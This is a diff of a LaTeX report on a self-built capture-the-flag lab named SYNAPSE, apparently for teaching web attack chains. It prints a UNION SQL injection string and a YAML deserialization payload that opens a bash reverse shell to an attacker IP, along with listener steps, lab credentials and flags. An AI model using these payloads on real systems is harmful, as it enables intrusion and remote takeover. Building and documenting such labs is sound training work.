@@ -694,10 +694,10 @@ obtained throughout the attack chain.
 \toprule
 \textbf{Step} & \textbf{Artefact} & \textbf{Location} & \textbf{Status} \\
 \midrule
-XSS theft       & Admin session cookie       & Browser cookie store     & Planned \\
-SQL Injection   & DB flag + Server-B creds   & admin\_users table       & Planned \\
-Lateral move    & SSH session on Server-B    & monitor@192.168.30.20    & Planned \\
-Cmd Injection   & Final flag                 & /root/flag\_final.txt    & Planned \\
+XSS theft        & Session cookie (guest)    & Browser cookie store       & Deployed \\
+SQL Injection    & FLAG\{synapse\_sqli\_creds\_dumped\} & admin\_users table & Deployed \\
+Admin Panel      & FLAG\{synapse\_admin\_classified\_accessed\} & classified\_intel & Deployed \\
+YAML Deser.      & FLAG\{synapse\_nexus\_exfil\_complete\} & /app/data/finalData.txt & Deployed \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -930,19 +930,19 @@ infrastructure component as of the current development phase.
 \midrule
 pfSense-LAB2         & Operational   & blockpriv + reply-to resolved \\
 VyOS-LAB2            & Operational   & Interfaces, NAT, DHCP, DNS all configured \\
-Server-A-SYNAPSE     & OS ready      & Ubuntu 24.04 installed; Flask app pending \\
-Server-B-SYNAPSE     & In progress   & OS installation in progress \\
-Parrot-Attacker      & Pending       & Static IP and tooling configuration pending \\
-SYNAPSE Portal (F3)  & Pending       & Flask app not yet deployed \\
-SYNAPSE Monitor (F4) & Pending       & Flask app not yet deployed \\
-Full walkthrough (F6) & Pending      & Blocked on F3 and F4 \\
+Server-A-SYNAPSE     & Operational   & SYNAPSE Portal: XSS, Broken Auth, SQLi, Admin Panel \\
+Server-B-SYNAPSE     & Operational   & DataVault: YAML deserialization + reverse shell \\
+Parrot-Attacker      & Pending       & Static IP pending (F5) \\
+SYNAPSE Portal (F3)  & Complete      & Docker Compose, 3 vulns + admin panel \\
+DataVault (F4)       & Complete      & YAML UnsafeLoader, reverse shell, final flag \\
+Full walkthrough (F6) & Pending      & Pending Parrot static IP (F5) \\
 \bottomrule
 \end{tabular}
 \end{table}
 
 \subsubsection{Vulnerabilities Demonstrated}
 
-The lab demonstrates four vulnerability classes that represent the most
+The lab demonstrates five vulnerability classes that represent the most
 consistently exploited categories in real web application assessments:
 
 \begin{itemize}
@@ -953,20 +953,19 @@ consistently exploited categories in real web application assessments:
     \item \textbf{UNION-based SQL Injection.} Direct string concatenation in a
           search query allows full exfiltration of the database, including
           credentials that enable lateral movement.
-    \item \textbf{Lateral movement via credential reuse.} Credentials stored in
-          the web application database are valid SSH credentials on a second
-          server, illustrating how a single web compromise can propagate across
-          a network.
-    \item \textbf{OS Command Injection.} Shell metacharacter injection in a
-          diagnostic form achieves remote code execution with the privilege
-          level of the web service process.
+    \item \textbf{Broken access control (admin panel).} The \texttt{/admin}
+          route checks role by reading an unsigned cookie, so a broken-auth
+          bypass grants immediate access to classified data and Server-B creds.
+    \item \textbf{Insecure YAML deserialization (OWASP A08).} Server-B's preview
+          endpoint passes attacker-controlled content to \texttt{yaml.UnsafeLoader},
+          enabling RCE via a reverse shell payload.
 \end{itemize}
 
 \subsubsection{Lessons Learned}
 
 \begin{itemize}
     \item \textbf{Attack chaining amplifies individual vulnerability impact.}
-          None of the four vulnerabilities in isolation would yield the final flag.
+          None of the five vulnerabilities in isolation would yield the final flag.
           Their combination demonstrates how moderate-severity findings combine
           into a critical-severity compromise, which is the standard pattern in
           real penetration test findings.
@@ -1080,7 +1079,11 @@ start. It creates four tables:
           (five dummy rows).
     \item \textbf{comments} --- user-submitted comments, rendered without
           sanitisation (XSS sink).
-    \item \textbf{admin\_users} --- lateral-movement credential store.
+    \item \textbf{admin\_users} --- credential and flag store. Contains
+          \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}} (FLAG~\#1).
+    \item \textbf{classified\_intel} --- classified intelligence table.
+          Contains \texttt{FLAG\{synapse\_admin\_classified\_accessed\}} (FLAG~\#2)
+          and Server-B credentials (\texttt{operator / D4t4V4ult\#2024}).
           Contains \texttt{monitor} / \texttt{M0nit0r2024} and
           \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}.
 \end{itemize}
@@ -1148,26 +1151,52 @@ credentials from the \texttt{admin\_users} table is:
 ' UNION SELECT 1,username,password,flag,5 FROM admin_users--
 \end{lstlisting}
 
-This returns the \texttt{monitor} SSH credentials (\texttt{M0nit0r2024})
-and the intermediate flag \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}.
+This returns \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}} (FLAG~\#1).
+The student then navigates to \texttt{/admin} with the forged admin cookie
+to obtain FLAG~\#2 and Server-B DataVault credentials.
+
+% ----------------------------------------
+\subsubsection{Phase F4: SYNAPSE DataVault (Server-B) --- Completed 2026-04-25}
+\label{subsubsec:lab2-f4-datavault}
+
+The SYNAPSE DataVault was deployed on Server-B (\texttt{192.168.30.20}) as a
+single Docker container running Flask and PyYAML~6.x.
+
+\paragraph{Vulnerability: YAML insecure deserialization.}
+The preview route uses \texttt{yaml.UnsafeLoader}, allowing arbitrary
+Python object instantiation via the \texttt{!!python/object/apply:} tag:
+
+\begin{lstlisting}[language=Python, caption={Vulnerable preview route (app.py)}]
+parsed = str(yaml.load(raw, Loader=yaml.UnsafeLoader))
+\end{lstlisting}
+
+\paragraph{Exploit payload.}
+\begin{lstlisting}[caption={YAML payload --- reverse shell to Parrot}]
+!!python/object/apply:os.system
+- "bash -c 'bash -i >& /dev/tcp/10.0.40.10/4444 0>&1'"
+\end{lstlisting}
+
+\paragraph{Exploit steps.}
+\begin{enumerate}
+    \item Start \texttt{nc -lvnp 4444} on Parrot (\texttt{10.0.40.10}).
+    \item Create \texttt{exploit.yml} with the payload above.
+    \item Log in to DataVault as \texttt{operator / D4t4V4ult\#2024}.
+    \item Upload \texttt{exploit.yml} and click \textbf{Preview}.
+    \item In reverse shell: \texttt{cat /app/data/finalData.txt}.
+\end{enumerate}
+
+The final flag is \texttt{FLAG\{synapse\_nexus\_exfil\_complete\}} (FLAG~\#3).
 
 % ----------------------------------------
 \subsubsection{Pending Phases}
-\label{subsubsec:lab2-pending-20260424}
+\label{subsubsec:lab2-pending-20260425}
 
 \begin{description}
-    \item[F4 --- Server-B (SYNAPSE Node Monitor.)]
-          Server-B (\texttt{192.168.30.20}) has Ubuntu~24.04 installed
-          with the OS user \texttt{monitor} created. Docker is not yet
-          installed. The Command Injection Flask application must be
-          deployed, and the flag file placed at \texttt{/root/flag\_final.txt}.
-    \item[F5 --- Parrot attacker setup.]
-          The Parrot node requires a static IP on \texttt{Net-Attackers}
-          (\texttt{10.0.40.10/24}) and \texttt{openssh-server} to allow
-          SSH access from the EVE-NG host for tool deployment.
+    \item[F5 --- Parrot static IP.]
+          Configure \texttt{nmcli} at session start:
+          \texttt{10.0.40.10/24}, GW \texttt{10.0.40.1}.
     \item[F6 --- Full attack walkthrough.]
-          End-to-end verification of the complete chain:
-          XSS $\rightarrow$ cookie hijack $\rightarrow$ SQLi
-          $\rightarrow$ SSH lateral movement $\rightarrow$
-          Command Injection $\rightarrow$ final flag.
+          End-to-end five-vulnerability chain: XSS \rightarrow{} broken auth
+          \rightarrow{} SQLi (FLAG~\#1) \rightarrow{} admin panel (FLAG~\#2)
+          \rightarrow{} YAML deserialization \rightarrow{} FLAG~\#3.
 \end{description}
